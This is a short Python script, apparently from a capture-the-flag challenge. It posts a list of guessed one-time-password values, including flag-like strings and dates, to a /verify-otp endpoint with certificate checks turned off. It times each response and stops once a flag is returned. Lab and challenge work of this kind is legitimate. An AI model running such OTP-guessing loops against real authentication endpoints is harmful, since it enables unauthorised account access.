import sys, requests, json, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
base = open(r"./_z_529base.txt").read().strip()
U = base + "/verify-otp"
cands = [
    "academy{1_l3d4b0utng", "1_l3d4b0utng", "1100001110001111000011100100",
    "1100001", "1990", "34567", "345.67", "tricky1990", "johnson", "50,000,000",
    "academy", "1_l3d4b0ut", "l3d4b0utng", "19900314", "0314",
]
for c in cands:
    try:
        t0 = time.time()
        r = requests.post(U, json={"otp": c}, timeout=15, verify=False)
        dt = (time.time() - t0) * 1000
        txt = r.text.strip()
        flag = json.loads(txt).get("flag") if txt.startswith("{") else None
        print("%-34r -> %s (%.0f ms) %s" % (c, r.status_code, dt, txt[:120]))
        if flag:
            print("   FLAG:", flag)
            break
    except Exception as e:
        print("%-34r ERR %s" % (c, type(e).__name__))
